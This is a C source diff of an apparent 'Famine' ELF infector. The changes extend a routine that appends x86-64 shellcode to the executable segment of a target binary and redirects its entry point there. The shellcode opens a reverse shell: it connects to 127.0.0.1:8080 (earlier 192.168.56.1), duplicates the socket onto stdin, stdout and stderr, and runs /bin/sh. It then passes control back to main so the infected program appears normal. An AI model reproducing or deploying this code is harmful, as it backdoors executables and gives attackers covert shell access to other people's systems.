@@ -1,5 +1,37 @@
 #include "famine.h"
 
+Elf64_Addr find_text_size_64(unsigned char *file) {
+    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
+    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
+    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
+    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
+    int shnum = header64->e_shnum;
+
+    for (int i = 0; i < shnum; i++) {
+        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
+        char *name_section = start_name_section + section->sh_name;
+        if (!strcmp(name_section, ".text"))
+            return section->sh_size;
+    }
+    return 0;
+}
+
+Elf64_Addr find_text_addr_64(unsigned char *file) {
+    Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
+    void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
+    void *section_name = &((Elf64_Shdr *)section_table)[header64->e_shstrndx];
+    char *start_name_section = (char *)(file + ((Elf64_Shdr *)section_name)->sh_offset);
+    int shnum = header64->e_shnum;
+
+    for (int i = 0; i < shnum; i++) {
+        Elf64_Shdr *section = &((Elf64_Shdr *)section_table)[i];
+        char *name_section = start_name_section + section->sh_name;
+        if (!strcmp(name_section, ".text"))
+            return section->sh_addr;
+    }
+    return 0;
+}
+
 Elf64_Off find_fini_offset_64(unsigned char *file) {
     Elf64_Ehdr *header64 = (Elf64_Ehdr *)file;
     void *section_table = (Elf64_Shdr *)(file + header64->e_shoff);
@@ -65,32 +97,75 @@ Elf64_Addr find_main_addr_64(unsigned char *file) {
     return 0;
 }
 
-int add_payload_64(unsigned char *file) {
+Elf64_Addr find_main_size_64(unsigned char *file) {
+    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)file;
+    Elf64_Shdr *shdr = (Elf64_Shdr *)(file + ehdr->e_shoff);
+    const char *sh_strtab = (char *)(file + shdr[ehdr->e_shstrndx].sh_offset);
+
+    Elf64_Shdr *symtab = NULL;
+    Elf64_Shdr *strtab = NULL;
+
+    for (int i = 0; i < ehdr->e_shnum; i++) {
+        const char *section_name = sh_strtab + shdr[i].sh_name;
+        if (!strcmp(section_name, ".symtab"))
+            symtab = &shdr[i];
+        else if (!strcmp(section_name, ".strtab"))
+            strtab = &shdr[i];
+    }
+
+    if (!symtab || !strtab) {
+        return 0;
+    }
+
+    Elf64_Sym *symbols = (Elf64_Sym *)(file + symtab->sh_offset);
+    const char *strtab_data = (char *)(file + strtab->sh_offset);
+    int num_symbols = symtab->sh_size / sizeof(Elf64_Sym);
+
+    for (int i = 0; i < num_symbols; i++) {
+        const char *name = strtab_data + symbols[i].st_name;
+        if (!strcmp(name, "main"))
+            return symbols[i].st_size;
+    }
+
+    return 0;
+}
+
+int add_payload_64(unsigned char *file, size_t size_file, int fd) {
     unsigned char payload_door[] = {
-        // --- Save stack ---
-        0x48, 0x89, 0xe3,                           // mov rbx, rsp
-        0x48, 0x31, 0xc0,                           // xor rax, rax
-        // 6 - 6
+        0x55,               // push rbp
+        0x48, 0x89, 0xe5,   // mov rbp,rsp
+        // 4 - 4
 
         // socket(AF_INET, SOCK_STREAM, 0)
         0x48, 0x31, 0xc0,                           // xor rax, rax
         0x48, 0xc7, 0xc7, 0x29, 0x00, 0x00, 0x00,   // mov rdi, 41
         0x48, 0xc7, 0xc6, 0x02, 0x00, 0x00, 0x00,   // mov rsi, 2
-        0xba, 0x01, 0x00, 0x00, 0x00,               // mov edx, 1
-        0xb8, 0x00, 0x00, 0x00, 0x00,               // mov eax, 0
+        0xba, 0x00, 0x00, 0x00, 0x00,               // mov edx, 0
+        0xb8, 0x29, 0x00, 0x00, 0x00,               // mov eax, 41
         0x0f, 0x05,                                 // syscall
-        // 29 - 35
+        // 29 - 33
 
         0x49, 0x89, 0xC0,                           // mov r8, rax
-        // 3 - 38
+        // 3 - 36
+
+        // mprotect
+        0x4c, 0x8d, 0x15, 0xf2, 0x00, 0x00, 0x00,               // lea r10, [rip + 242]
+        0x4c, 0x89, 0xd7,                                       // mov rdi, r10
+        0x48, 0x81, 0xe7, 0x00, 0xf0, 0xff, 0xff,               // and rdi, 0xfffffffffffff000
+        0x48, 0xc7, 0xc6, 0x00, 0x10, 0x00, 0x00,               // mov rsi, 0x1000
+        0x48, 0xc7, 0xc2, 0x07, 0x00, 0x00, 0x00,               // mov rdx, 7
+        0xb8, 0x0a, 0x00, 0x00, 0x00,                           // mov eax, 10
+        0x0f, 0x05,                                             // syscall
+        // 38 - 74
 
         // create value struct sockaddr
-        0x4D, 0x31, 0xD2,                               // xor r10, r10
-        0x66, 0xC7, 0x07, 0x02, 0x00,                   // mov word [r10], 0x2
-        0x66, 0xC7, 0x47, 0x02, 0x1F, 0x90,             // mov word [r10+2], 0x1F90  => Port 8080
-        0xC7, 0x47, 0x04, 0xC0, 0xA8, 0x38, 0x01,       // mov dword [r10+4], 0xC0A83801 => addr ip 192.168.56.1
-        0x48, 0x31, 0x00,                               // xor [r10+8], rax
-        // 24 - 62
+        0x48, 0x31, 0xd2,                                   // xor rdx, rdx
+        0x66, 0x41, 0xC7, 0x02, 0x02, 0x00,                 // mov word [r10], 0x2
+        0x66, 0x41, 0xC7, 0x42, 0x02, 0x90, 0x1F,           // mov word [r10+2], 0x1F90 => Port 8080
+        0x41, 0xC7, 0x42, 0x04, 0x01, 0x00, 0x00, 0x7f,     // mov dword [r10+4], 0x7f000001 => addr ip 127.0.0.1 
+        0x48, 0x31, 0xC0,                                   // xor rax, rax
+        0x49, 0x31, 0x42, 0x08,                             // xor [r10+8], rax
+        // 31 - 105
 
         // connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))
         0x48, 0xc7, 0xc0, 0x2a, 0x00, 0x00, 0x00,       // mov rax, 42
@@ -98,32 +173,32 @@ int add_payload_64(unsigned char *file) {
         0x4c, 0x89, 0xd6,                               // mov rsi, r10
         0xba, 0x10, 0x00, 0x00, 0x00,                   // mov edx, 16
         0x0f, 0x05,                                     // syscall
-        // 20 - 82
+        // 20 - 125
 
         // fork()
         0x48, 0xc7, 0xc0, 0x39, 0x00, 0x00, 0x00,       // mov rax,57
         0x0f, 0x05,                                     // syscall
-        // 9 - 91
+        // 9 - 134
 
         // si enfant -> rax = 0
         0x48, 0x85, 0xc0,                               // test rax, rax
-        0x0f, 0x85, 0x4e, 0x00, 0x00, 0x00,             // jne on saute de 78
-        // 9 - 100
+        0x0f, 0x85, 0x5a, 0x00, 0x00, 0x00,             // jne on saute de 90
+        // 9 - 143
 
         // dup2
         0x48, 0xc7, 0xc0, 0x21, 0x00, 0x00, 0x00,       // mov rax, 33
         0x49, 0x89, 0xc7,                               // mov rdi, r8
         0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00,       // mov rsi, 0 -> stdin
         0x0f, 0x05,                                     // syscall
-        // 19 - 119
+        // 19 - 162
 
         0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00,       // mov rsi, 1 -> stdout
         0x0f, 0x05,                                     // syscall
-        // 9 - 128
+        // 9 - 171
 
         0x48, 0xc7, 0xc6, 0x02, 0x00, 0x00, 0x00,       // mov rsi, 2 -> stderr
         0x0f, 0x05,                                     // syscall
-        // 9 - 137
+        // 9 - 180
 
         // execve("/bin/sh", NULL, NULL)
         0x48, 0x31, 0xd2,                                               // xor rdx, rdx
@@ -133,13 +208,13 @@ int add_payload_64(unsigned char *file) {
         0x48, 0x31, 0xf6,                                               // xor rsi, rsi
         0xb8, 0x3b, 0x00, 0x00, 0x00,                                   // mov eax, 59
         0x0f, 0x05,                                                     // syscall
-        // 27 - 164
+        // 27 - 207
 
         // exit(1)
         0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,       // mov rdi, 1
         0xb8, 0x3c, 0x00, 0x00, 0x00,                   // mov eax, 60
         0x0f, 0x05,                                     // syscall
-        // 14 - 174
+        // 14 - 221
 
         0x48, 0x8b, 0x3c, 0x24,                                     // mov    rdi, [rsp]      ; argc
         0x48, 0x8d, 0x74, 0x24, 0x08,                               // lea    rsi, [rsp+8]    ; argv
@@ -149,23 +224,43 @@ int add_payload_64(unsigned char *file) {
         0x48, 0x85, 0xc0,                                           // test   rax, rax
         0x75, 0xf4,                                                 // jnz    -0x0C
         0x48, 0x89, 0xca,                                           // mov    rdx, rcx        ; rdx = envp
-        0x48, 0xb8,                                                 // mov rax, <main_addr>
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // <main_addr>
+        0x48, 0x8d, 0x05, 0x00, 0x00, 0x00, 0x00,                   // lea rax, [rip]
+        0x48, 0x2d, 0x00, 0x00, 0x00, 0x00,                         // sub rax, <dist to main>
+        0x48, 0x89, 0xe5,                                           // mov rsp, rbp
+        0x5d,                                                       // pop rbp
+        0x48, 0x8d, 0x1d, 0x03, 0x00, 0x00, 0x00,                   // lea rbx, [rip + 0x3]
+        0x53,                                                       // push rbx
         0xff, 0xd0,                                                 // call rax
-        // 39 - 213
+        // 54 - 275
+
+        // --- exit(0) ---
+        0x48, 0x31, 0xff,                           // xor rdi, rdi
+        0xb8, 0x3c, 0x00, 0x00, 0x00,               // mov eax, 60
+        0x0f, 0x05,                                 // syscall
+        // 10 -- 285
+
+        // stock struct
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
     };
 
     Elf64_Addr main_addr = find_main_addr_64(file);
-    if (main_addr == 0)
+    Elf64_Addr fini_size = find_fini_size_64(file);
+    Elf64_Addr main_size = find_main_size_64(file);
+    if (main_addr == 0 || fini_size == 0 || main_size == 0)
         return -1;
-    memcpy(&payload_door[203], &main_addr, 8);
+    size_t payload_size = sizeof(payload_door);
+    uint64_t t_payload = payload_size - 44;
+    Elf64_Addr dist_to_main = fini_size + main_size + t_payload - 2;
+    memcpy(&payload_door[t_payload], &dist_to_main, 4);
 
-    size_t payload_size = sizeof(payload_door) - 1;
+    ftruncate(fd, size_file + payload_size);
+
+    munmap(file, size_file);
+    file = mmap(NULL, size_file + payload_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 
     Elf64_Ehdr *ehdr = (Elf64_Ehdr *)file;
     Elf64_Phdr *phdr = (Elf64_Phdr *)(file + ehdr->e_phoff);
 
-    // find PT_LOAD
     Elf64_Phdr *exec_segment = NULL;
     for (int i = 0; i < ehdr->e_phnum; i++) {
         if ((phdr[i].p_type == PT_LOAD) && (phdr[i].p_flags & PF_X)) {
@@ -176,31 +271,35 @@ int add_payload_64(unsigned char *file) {
     if (!exec_segment)
         return -1;
 
-    size_t injection_offset = exec_segment->p_offset + exec_segment->p_filesz;
+    Elf64_Off injection_offset = exec_segment->p_offset + exec_segment->p_filesz;
     Elf64_Addr injection_vaddr = exec_segment->p_vaddr + exec_segment->p_filesz;
 
     exec_segment->p_filesz += payload_size;
-    exec_segment->p_memsz  += payload_size;
+    exec_segment->p_memsz += payload_size;
 
-    memcpy(file + injection_offset, payload_door, payload_size);
-    
+    pwrite(fd, payload_door, payload_size, injection_offset);
+    // memcpy(file + injection_offset, payload_door, payload_size);
+
+    size_t phdrs_size = ehdr->e_phnum * sizeof(Elf64_Phdr);
+    pwrite(fd, phdr, phdrs_size, ehdr->e_phoff);
+
     ehdr->e_entry = injection_vaddr;
+    pwrite(fd, ehdr, sizeof(Elf64_Ehdr), 0);
 
     return payload_size;
 }
 
-int handle_64(unsigned char *file) {
+int handle_64(unsigned char *file, size_t size_file, int fd) {
     unsigned char payload[] = "Famine version 0.7 (c)oded jul-0064 by bob\n";
     size_t size_payload = strlen((const char *)payload);
 
-    int size_payload_door = add_payload_64(file);
+    int size_payload_door = add_payload_64(file, size_file, fd);
+    // printf("Size payload: %lx\n", size_payload_door);
     size_t injection_offset;
     if (size_payload_door == -1)
         injection_offset = find_fini_offset_64(file) + find_fini_size_64(file);
     else
         injection_offset = find_fini_offset_64(file) + find_fini_size_64(file) + size_payload_door;
-    // size_t injection_offset = find_fini_offset_64(file) + find_fini_size_64(file);
-
     memcpy(file + injection_offset, payload, size_payload);
 
     return 0;
